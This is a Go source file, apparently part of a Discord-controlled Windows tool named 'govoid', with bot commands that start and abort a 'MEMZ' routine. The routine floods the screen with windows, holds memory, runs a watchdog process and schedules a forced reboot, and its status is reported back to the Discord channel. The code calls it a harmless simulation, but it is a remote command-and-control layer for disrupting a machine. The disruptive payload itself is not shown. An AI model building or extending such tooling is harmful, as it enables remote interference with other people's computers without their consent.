//go:build windows

package commands

import (
	"fmt"
	"strings"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/ui"
	"github.com/local/govoid/internal/win32"
)

func MemzStart(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	opts := win32.MemzDefaults()

	_, _ = s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{
		Content: fmt.Sprintf("💀 **MEMZ iniciado**\nVentanas: %d · memoria máxima: %d MB · duración: %d s · reinicio en %d s",
			opts.WindowCount, opts.MemoryCapMB, int(opts.Duration.Seconds()), int(opts.RestartDelay.Seconds())),
	})

	go func() {
		report := win32.RunMemz(opts)
		content := memzResultView(report)
		components := ui.MemzResultPanel()
		_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
			Content:    &content,
			Components: &components,
		})
	}()
}

func MemzAbort(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	if err := win32.AbortMemzRestart(); err != nil {
		content := "⚠️ **No se pudo abortar el reinicio**\n```\n" + err.Error() + "\n```"
		_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Content: &content})
		return
	}

	content := "🛑 **Reinicio abortado**\nLa simulación terminó y la PC sigue encendida. Nada quedó modificado."
	_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Content: &content})
}

func memzResultView(report win32.MemzReport) string {
	var out strings.Builder

	if report.Err != "" {
		out.WriteString("⚠️ **MEMZ terminó con avisos**\n\n")
	} else {
		out.WriteString("💀 **MEMZ — simulación terminada**\n\n")
	}

	fmt.Fprintf(&out, "• Ventanas: **%d**\n", report.Windows)
	fmt.Fprintf(&out, "• Memoria retenida: **%d MB**\n", report.PeakMB)
	fmt.Fprintf(&out, "• Duración: **%d ms**\n", report.Duration.Milliseconds())

	if report.RestartScheduled {
		if report.CountdownS > 0 {
			fmt.Fprintf(&out, "• Reinicio: **en %d s**\n", report.CountdownS)
		} else {
			out.WriteString("• Reinicio: **programado**\n")
		}
	} else if report.Err == "" {
		out.WriteString("• Reinicio: **no programado**\n")
	}

	if report.WatchdogPID > 0 {
		fmt.Fprintf(&out, "• Vigilante: **PID %d**\n", report.WatchdogPID)
	}
	if report.Err != "" {
		fmt.Fprintf(&out, "• Error: `%s`\n", report.Err)
	}

	out.WriteString("\nLa PC se reinicia y todo vuelve a la normalidad.\n")
	out.WriteString("Puedes cancelar con **Abortar reinicio**.\n")

	return out.String()
}
